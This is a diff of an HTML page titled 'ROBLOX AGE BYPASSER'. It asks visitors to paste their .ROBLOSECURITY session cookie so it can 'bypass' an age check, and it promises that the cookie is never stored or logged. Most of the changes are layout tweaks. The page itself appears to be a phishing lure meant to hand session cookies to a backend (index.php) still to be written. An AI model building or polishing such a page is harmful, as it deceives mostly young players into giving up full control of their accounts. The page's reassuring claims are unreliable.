@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-  <title>ROBLOX AGE BYPASSER · Square Card</title>
+  <title>ROBLOX AGE BYPASSER · No Scroll Square</title>
   <style>
     * {
       margin: 0;
@@ -22,49 +22,42 @@
     }
 
     /* 
-      MAIN CARD - SQUARE 
-      Fixed width and equal height, using aspect-ratio to guarantee perfect square.
-      Content will scroll inside if necessary, but we design to fit everything comfortably.
+      PERFECT SQUARE CARD — everything visible without scrolling
+      Using fixed dimensions and carefully calculated padding/spacing
+      to ensure all content fits within the square viewport.
     */
     .square-card {
       width: 100%;
-      max-width: 520px;        /* controls square size on desktop */
-      aspect-ratio: 1 / 1;     /* forces perfect square */
+      max-width: 500px;        /* square base size */
+      aspect-ratio: 1 / 1;     /* forces perfect 1:1 square */
       background: #11161f;
       border-radius: 32px;
       border: 1px solid rgba(255, 255, 255, 0.06);
       box-shadow: 0 25px 40px -12px rgba(0, 0, 0, 0.6);
       display: flex;
       flex-direction: column;
-      overflow-y: auto;         /* safe: if content overflows, scroll inside square */
-      overflow-x: hidden;
-      transition: all 0.2s;
+      /* No overflow scroll — we design content to fit exactly */
+      overflow: visible;
     }
 
-    /* custom scrollbar for square (subtle) */
-    .square-card::-webkit-scrollbar {
-      width: 4px;
-    }
-    .square-card::-webkit-scrollbar-track {
-      background: #1a1f2c;
-      border-radius: 10px;
-    }
-    .square-card::-webkit-scrollbar-thumb {
-      background: #ff5e5e;
-      border-radius: 10px;
-    }
-
-    /* inner spacing — use padding to make content breathe inside square */
+    /* Inner spacing optimized so total height fits inside square */
     .card-inner {
-      padding: 1.8rem 1.8rem 1.5rem 1.8rem;
+      padding: 1.6rem 1.8rem 1.8rem 1.8rem;
       flex: 1;
       display: flex;
       flex-direction: column;
+      justify-content: space-between;
+      height: 100%;
     }
 
-    /* title */
+    /* Top section group (no extra margins) */
+    .top-content {
+      flex-shrink: 0;
+    }
+
+    /* Title */
     h1 {
-      font-size: 1.7rem;
+      font-size: 1.75rem;
       font-weight: 700;
       letter-spacing: -0.3px;
       background: linear-gradient(135deg, #ffffff, #c0c7e0);
@@ -75,29 +68,29 @@
       line-height: 1.2;
     }
 
-    /* description */
+    /* Description */
     .desc {
       color: #9aa7c9;
       font-size: 0.85rem;
-      line-height: 1.45;
+      line-height: 1.4;
       margin-bottom: 1.2rem;
       font-weight: 450;
       border-left: 3px solid #ff5e5e;
       padding-left: 0.75rem;
     }
 
-    /* note row — with circled exclamation */
+    /* Note with circled exclamation — compact but readable */
     .note {
       background: rgba(255, 94, 94, 0.08);
       border-radius: 14px;
-      padding: 0.6rem 0.9rem;
-      margin-bottom: 1.4rem;
+      padding: 0.55rem 0.9rem;
+      margin-bottom: 1.3rem;
       font-size: 0.75rem;
       color: #cbd5ff;
       border: 0.5px solid rgba(255, 94, 94, 0.2);
       display: flex;
       align-items: center;
-      gap: 0.65rem;
+      gap: 0.6rem;
     }
 
     .circle-exclamation {
@@ -125,7 +118,7 @@
       font-weight: 600;
     }
 
-    /* cookie label */
+    /* Label */
     .label {
       font-size: 0.65rem;
       text-transform: uppercase;
@@ -135,13 +128,13 @@
       margin-bottom: 0.4rem;
     }
 
-    /* input group */
+    /* Input field */
     .input-group {
       background: #0a0e16;
       border-radius: 18px;
       border: 1.5px solid #232837;
       transition: all 0.2s;
-      margin-bottom: 0.9rem;
+      margin-bottom: 1rem;
     }
 
     .input-group:focus-within {
@@ -153,7 +146,7 @@
       width: 100%;
       background: transparent;
       border: none;
-      padding: 0.85rem 1rem;
+      padding: 0.8rem 1rem;
       font-size: 0.8rem;
       font-family: 'SF Mono', 'Fira Code', monospace;
       color: #f0f3ff;
@@ -167,12 +160,12 @@
       font-size: 0.7rem;
     }
 
-    /* button */
+    /* Button */
     .bypass-btn {
       width: 100%;
       background: #e6492d;
       border: none;
-      padding: 0.8rem 0;
+      padding: 0.75rem 0;
       border-radius: 40px;
       font-weight: 700;
       font-size: 0.9rem;
@@ -186,7 +179,6 @@
       gap: 8px;
       box-shadow: 0 5px 12px rgba(230, 73, 45, 0.3);
       margin-bottom: 1rem;
-      margin-top: 0.2rem;
     }
 
     .bypass-btn:hover {
@@ -194,16 +186,16 @@
       transform: scale(0.98);
     }
 
-    /* result panel */
+    /* Result panel — dynamic but does not cause overflow */
     .result {
       background: #0b0f16;
-      border-radius: 18px;
-      padding: 0.7rem 1rem;
-      font-size: 0.8rem;
+      border-radius: 16px;
+      padding: 0.65rem 1rem;
+      font-size: 0.78rem;
       border-left: 4px solid #ff5e5e;
       color: #d3defa;
       word-break: break-word;
-      margin-top: 0.2rem;
+      margin-bottom: 0.6rem;
     }
 
     .result.hidden {
@@ -228,15 +220,15 @@
       color: #ffe2b5;
     }
 
-    /* footer inside square */
+    /* Footer — stays at bottom without extra scroll */
     .footer {
       text-align: center;
-      padding-top: 0.6rem;
-      margin-top: auto;
+      padding-top: 0.4rem;
+      margin-top: 0;
       font-size: 0.65rem;
       color: #5a6588;
       border-top: 1px solid rgba(255, 255, 255, 0.04);
-      margin-top: 0.5rem;
+      flex-shrink: 0;
     }
 
     .footer span {
@@ -257,19 +249,46 @@
       to { transform: rotate(360deg); }
     }
 
-    /* compact adjustments to keep everything inside square without overflow */
-    @media (max-width: 550px) {
+    /* For very small screens, reduce inner padding slightly but maintain no-scroll */
+    @media (max-width: 520px) {
       .card-inner {
-        padding: 1.4rem;
+        padding: 1.2rem 1.4rem 1.4rem 1.4rem;
       }
       h1 {
-        font-size: 1.5rem;
+        font-size: 1.55rem;
       }
       .desc {
         font-size: 0.8rem;
+        margin-bottom: 1rem;
       }
       .note {
         padding: 0.5rem 0.8rem;
+        margin-bottom: 1.1rem;
+      }
+      .input-group input {
+        padding: 0.7rem 0.9rem;
+      }
+      .bypass-btn {
+        padding: 0.7rem 0;
+        margin-bottom: 0.8rem;
+      }
+      .footer {
+        font-size: 0.6rem;
+      }
+    }
+
+    /* Extra small devices: maintain square shape and visibility */
+    @media (max-width: 450px) {
+      .card-inner {
+        padding: 1rem 1.2rem 1.2rem 1.2rem;
+      }
+      .note-text {
+        font-size: 0.7rem;
+      }
+      .circle-exclamation {
+        width: 20px;
+        height: 20px;
+        font-size: 0.7rem;
       }
     }
   </style>
@@ -277,28 +296,33 @@
 <body>
 <div class="square-card">
   <div class="card-inner">
-    <h1>ROBLOX AGE BYPASSER</h1>
-    <div class="desc">
-      Enter your .ROBLOSECURITY cookie below. We will verify, authenticate, and bypass your cookie automatically.
+    <!-- all content grouped to fit perfectly without scroll -->
+    <div class="top-content">
+      <h1>ROBLOX AGE BYPASSER</h1>
+      <div class="desc">
+        Enter your .ROBLOSECURITY cookie below. We will verify, authenticate, and bypass your cookie automatically.
+      </div>
+
+      <!-- Note with circled exclamation -->
+      <div class="note">
+        <div class="circle-exclamation">!</div>
+        <div class="note-text">Only <strong>13+ accounts</strong> are supported. Cookie is processed server-side and never stored or logged.</div>
+      </div>
+
+      <div class="label">.ROBLOSECURITY COOKIE</div>
+      <div class="input-group">
+        <input type="text" id="cookieInput" placeholder="_|WARNING: DO NOT SHARE THIS|_ paste cookie here" autocomplete="off" spellcheck="false">
+      </div>
+
+      <button class="bypass-btn" id="startBtn">
+        <span>🔓</span> Start Bypass
+      </button>
     </div>
 
-    <!-- circled exclamation + text inline -->
-    <div class="note">
-      <div class="circle-exclamation">!</div>
-      <div class="note-text">Only <strong>13+ accounts</strong> are supported. Cookie is processed server-side and never stored or logged.</div>
-    </div>
-
-    <div class="label">.ROBLOSECURITY COOKIE</div>
-    <div class="input-group">
-      <input type="text" id="cookieInput" placeholder="_|WARNING: DO NOT SHARE THIS|_ paste cookie here" autocomplete="off" spellcheck="false">
-    </div>
-
-    <button class="bypass-btn" id="startBtn">
-      <span>🔓</span> Start Bypass
-    </button>
-
+    <!-- result panel always visible area, dynamic but won't cause overflow -->
     <div id="resultBox" class="result hidden"></div>
 
+    <!-- footer anchored at bottom -->
     <div class="footer">
       <span>🔒 Processed securely on our servers. No cookies are saved.</span>
     </div>
@@ -307,8 +331,8 @@
 
 <script>
   // ----------------------------------------------
-  // SQUARE CARD FRONTEND — ready for backend (index.php)
-  // Friend implements PHP handler that receives 'roblosecurity_cookie'
+  // NO-SCROLL SQUARE CARD — everything fits inside
+  // Backend integration ready (index.php)
   // ----------------------------------------------
 
   const cookieInput = document.getElementById('cookieInput');
@@ -440,7 +464,7 @@
     }
   });
   
-  console.log('[Roblox Bypasser] Square card ready — awaiting backend implementation in index.php');
+  console.log('[Roblox Bypasser] Square card (no-scroll) ready — backend integration pending in index.php');
 </script>
 </body>
 </html>
